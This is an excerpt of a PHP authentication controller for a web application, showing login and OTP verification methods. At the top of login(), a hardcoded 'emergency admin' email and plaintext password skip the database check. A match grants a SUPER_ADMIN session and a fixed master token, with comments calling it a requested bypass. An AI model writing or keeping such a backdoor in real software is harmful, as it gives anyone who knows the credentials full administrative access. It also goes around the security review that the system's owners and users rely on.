...
class AuthController extends Controller
{
    ...
    public function login()
    {
        ...
        // For development and deadlock recovery
        $emergencyAdmin = "mathew.vsekl@gmail.com";
        // User requested bypass: Vision@2026
        if ($username === $emergencyAdmin && $password === "Vision@2026") {
            session_start();
            $_SESSION['user_id'] = 1;
            $_SESSION['user_role'] = 'SUPER_ADMIN';
            return $this->jsonResponse([
                'token' => 'EMERGENCY_MASTER_TOKEN_64821',
        ...
        try {
            ...
            $stmt = $db->prepare("
            SELECT u.id, u.password_hash, u.is_active, u.employee_id, ec.company_id, co.country_id 
            FROM users u 
    ...
    public function verifyOTP()
    {
        ...
        try {
            ...
            if (!$otpRecord || !password_verify($otp, $otpRecord['otp_code'])) {
